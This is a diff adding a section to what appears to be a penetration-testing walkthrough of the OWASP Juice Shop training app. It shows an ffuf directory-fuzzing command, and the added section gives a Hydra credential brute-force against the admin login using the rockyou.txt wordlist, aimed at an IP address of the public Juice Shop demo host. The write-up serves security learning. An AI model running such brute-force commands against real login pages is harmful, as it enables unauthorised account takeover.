@@ -71,3 +71,25 @@ In this phase, we used the FFUF tool to identify the admin path for the URL, whi
 ```
 ffuf -w /usr/share/wordlists/dirb/common.txt -u http://127.0.0.1:42000/#/FUZZ  -c -v
 ```
+# 5- BruteForce on Admin Credentials
+
+![Screenshot01](https://github.com/hossam-ahmedd/juice-shop/blob/main/hydra1.png?raw=true)
+
+In this phase, we used Hydra to BruteForce on the admin password from the `rockyou.txt` wordlist. The following steps outline the process:
+
+
+First, ensure that you have the `rockyou.txt` wordlist available. If it is compressed, extract it using the following command:
+
+```
+cd /usr/share/wordlists/   
+gunzip rockyou.txt.gz
+```
+Then, We ping on the juice-shop url to get the ip address
+```
+ping -c 1 juice-shop.herokuapp.com
+```
+Finally, We Use the Hydra command to make login attempts with all wordlist records
+```
+hydra -l admin@juice-sh.op -P /usr/share/wordlists/rockyou.txt 54.220.192.176  https-post-form "/rest/user/login:email=^USER^&password=^PASS^:F=Invalid email or password" -V -I
+```
+
